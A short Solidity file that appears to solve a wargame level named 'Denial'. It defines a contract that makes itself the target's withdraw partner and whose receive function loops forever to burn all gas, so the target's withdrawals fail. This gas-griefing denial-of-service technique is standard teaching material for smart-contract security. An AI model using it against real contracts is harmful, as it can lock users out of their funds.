// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Denial.sol";

contract Deny {
    constructor(Denial _denial) {
        _denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        // I'll just use all gas :D
        for (;;) {}
    }
}
